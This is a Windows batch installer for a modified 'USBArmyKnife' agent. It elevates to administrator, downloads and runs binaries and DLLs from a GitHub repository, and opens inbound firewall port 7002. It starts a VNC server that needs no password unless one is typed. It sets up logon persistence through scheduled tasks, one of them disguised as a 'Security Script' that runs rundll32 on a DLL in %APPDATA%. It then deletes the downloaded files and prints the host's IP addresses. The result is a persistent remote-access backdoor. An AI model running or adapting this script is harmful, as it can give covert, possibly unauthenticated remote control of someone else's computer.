@echo off
setlocal EnableExtensions
title USBArmyKnife Installer

REM ============================================================
REM  USBArmyKnife Installer
REM  Downloads files from GitHub to the installer's directory,
REM  copies to C:\AgentInstall, sets up autostart/firewall,
REM  then deletes the downloaded files.
REM ============================================================

set "DEST=C:\AgentInstall"
set "BASE=https://raw.githubusercontent.com/Korbi0312/USBArmyKnife-modded/master/tools/Installer"
set "DIR=%~dp0"

REM --- Elevation check ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Administrator privileges required...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo.
echo ========================================
echo   USBArmyKnife Installer
echo ========================================
echo.

REM --- Password prompt ---
echo VNC Password (optional):
echo    Press Enter for no password.
echo.
set "VNCPASSWD="
set /p "VNCPASSWD=Password: "
if defined VNCPASSWD (
    echo    Password set.
) else (
    echo    No password.
)
echo.

REM --- 1. Stop running processes ---
echo [1/6] Stopping running processes...
taskkill /F /IM AgentLauncher.exe >nul 2>&1
taskkill /F /IM VncDirect.exe >nul 2>&1
timeout /t 1 /nobreak >nul

REM --- 2. Download files to installer directory ---
echo [2/6] Downloading files from GitHub...

echo    Downloading VncDirect.zip...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/VncDirect.zip' -OutFile '%DIR%VncDirect.zip' -UseBasicParsing" >nul 2>&1
if not exist "%DIR%VncDirect.zip" (
    echo    [!] FAILED to download VncDirect.zip
    echo    Check your internet connection and try again.
    pause
    exit /b 1
)

echo    Downloading agent files...
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%DIR%AgentLauncher.exe' -UseBasicParsing" 2>nul
if not exist "%DIR%AgentLauncher.exe" (
    echo    [!] FAILED to download AgentLauncher.exe
    echo    Check your internet connection.
    pause
    exit /b 1
)
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/PortableApp.dll' -OutFile '%DIR%PortableApp.dll' -UseBasicParsing" 2>nul
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/turbojpeg.dll' -OutFile '%DIR%turbojpeg.dll' -UseBasicParsing" 2>nul
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/vcruntime140.dll' -OutFile '%DIR%vcruntime140.dll' -UseBasicParsing" 2>nul
powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/WmiLight.Native.dll' -OutFile '%DIR%WmiLight.Native.dll' -UseBasicParsing" 2>nul

echo    Downloads complete.

REM --- 3. Copy files to destination ---
echo [3/6] Installing to %DEST%...
if not exist "%DEST%" mkdir "%DEST%"
if not exist "%DEST%\VncDirect" mkdir "%DEST%\VncDirect"

copy /y "%DIR%AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul
copy /y "%DIR%PortableApp.dll" "%DEST%\PortableApp.dll" >nul
copy /y "%DIR%turbojpeg.dll" "%DEST%\turbojpeg.dll" >nul
copy /y "%DIR%vcruntime140.dll" "%DEST%\vcruntime140.dll" >nul
copy /y "%DIR%WmiLight.Native.dll" "%DEST%\WmiLight.Native.dll" >nul

REM Extract VncDirect.zip
powershell -NoProfile -Command "Expand-Archive -Path '%DIR%VncDirect.zip' -DestinationPath '%DEST%' -Force" >nul 2>&1

REM --- Save password ---
if not "%VNCPASSWD%"=="" (
    echo [+] Saving password...
    powershell -NoProfile -Command "$j = @{}; if (Test-Path '%DEST%\VncDirect\vnc-settings.json') { $j = Get-Content '%DEST%\VncDirect\vnc-settings.json' -Raw | ConvertFrom-Json -AsHashtable }; $j['password'] = '%VNCPASSWD%'; $j | ConvertTo-Json | Set-Content '%DEST%\VncDirect\vnc-settings.json' -Encoding UTF8"
)

REM --- 4. Set up autostart ---
echo [4/6] Setting up autostart...

schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "USBArmyKnife Agent" /tr "\"%DEST%\AgentLauncher.exe\" vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "USBArmyKnife Agent" created.
)

schtasks /query /tn "Security Script" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "Security Script" /tr "rundll32 \"%APPDATA%\PortableApp.dll\" Open32 vid=cafe pid=403f cwd=%APPDATA%" /sc onlogon /rl limited /f >nul 2>&1
    echo     Scheduled task "Security Script" created.
)

REM --- 5. Firewall rule ---
echo [5/6] Setting up firewall rule...
netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
if %errorlevel% neq 0 (
    netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul
    echo     Firewall rule created.
)

REM --- 6. Start services ---
echo [6/6] Starting Agent and VNC Server...
start "" "%DEST%\VncDirect\VncDirect.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=240 scale=0
start "" "%DEST%\AgentLauncher.exe" vid=cafe pid=403f cwd=%DEST%

REM Wait for port
set /a tries=0
:checkport
set /a tries+=1
powershell -NoProfile -Command "if (Get-NetTCPConnection -LocalPort 7002 -State Listen -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }" >nul 2>&1
if not %errorlevel% equ 0 (
    if %tries% lss 10 (
        timeout /t 1 /nobreak >nul
        goto checkport
    )
)
if %tries% lss 10 (
    echo     VNC Server listening on port 7002.
)

REM --- Cleanup downloaded files from installer directory ---
echo.
echo Cleaning up downloaded files...
del "%DIR%AgentLauncher.exe" >nul 2>&1
del "%DIR%PortableApp.dll" >nul 2>&1
del "%DIR%turbojpeg.dll" >nul 2>&1
del "%DIR%vcruntime140.dll" >nul 2>&1
del "%DIR%WmiLight.Native.dll" >nul 2>&1
del "%DIR%VncDirect.zip" >nul 2>&1

echo.
echo ========================================
echo   Installation complete!
echo ========================================
echo.
echo PC Name:   %COMPUTERNAME%
echo IP Addresses:
for /f "usebackq tokens=2 delims=:" %%i in (`ipconfig ^| findstr /r "IPv4"`) do echo     %%i
echo.
if not "%VNCPASSWD%"=="" (
    echo VNC Password: %VNCPASSWD%
    echo.
)
echo Window closes in 10 seconds...
timeout /t 10 /nobreak >nul
endlocal
